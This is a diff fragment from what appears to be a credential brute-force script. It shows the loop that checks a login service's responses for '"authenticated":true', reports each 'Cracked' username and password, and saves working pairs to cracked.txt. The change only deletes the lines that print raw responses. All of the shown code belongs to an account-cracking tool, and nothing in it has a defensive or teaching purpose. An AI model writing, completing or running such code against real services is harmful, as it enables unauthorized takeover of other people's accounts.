@@ -57,13 +57,13 @@ def log():
         if ('"authenticated":true') in r:
             print(f'Cracked [$] {user}:{password}')
             open("cracked.txt","w").writelines(f'{user}:{password}')
-            print(r)
+            
         elif ('"authenticated":false') in r:
              print(f'Trying [!] {user}:{password}')
-             print(r)
+             
         else:
             print(f'ERROR [!] {user}:{password}')
-            print(r)
+            
 
 
 log()
